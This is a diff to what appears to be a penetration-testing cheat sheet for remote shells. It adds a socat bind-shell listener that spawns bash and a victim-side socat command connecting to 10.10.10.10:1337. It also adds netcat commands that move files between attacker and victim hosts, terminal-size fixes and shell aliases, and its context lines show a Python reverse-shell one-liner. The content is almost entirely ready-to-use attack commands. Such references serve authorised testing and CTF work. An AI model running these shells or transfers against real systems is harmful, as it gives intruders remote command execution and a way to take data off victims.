@@ -50,6 +50,19 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 ## Bind Shell
 
+### Socat
+
+Listener:
+```
+socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
+```
+
+Victim:
+
+```
+socat FILE:`tty`,raw,echo=0 TCP:10.10.10.10:1337
+```
+
 ### Bash
 
 ```
@@ -175,6 +188,49 @@ python -c 'import pty; pty.spawn("/bin/sh")'
 use post/multi/manage/shell_to_meterpreter
 ```
 
+## Fix Width
+
+On attacker host:
+```
+stty -a
+```
+
+In (`socat`) shell:
+```
+stty rows 57 cols 211
+```
+
+## Transferring files (e.g. socat or tsh)
+
+### Attacker = Listener
+
+Sender:
+```
+nc -vvlp 1337 < file
+```
+
+Receiver:
+```
+nc <IP> <PORT> > /tmp/yolofile
+```
+
+### Victim = Listener
+Receiver:
+```
+nc -l -p 1234 > out.file
+```
+
+Sender:
+```
+nc -w 3 <IP> 1234 < out.file
+```
+
+## Aliases
+
+```
+alias "l"="ls -la" && \
+alias ".."="cd .."
+```
 
 ## Resources
 
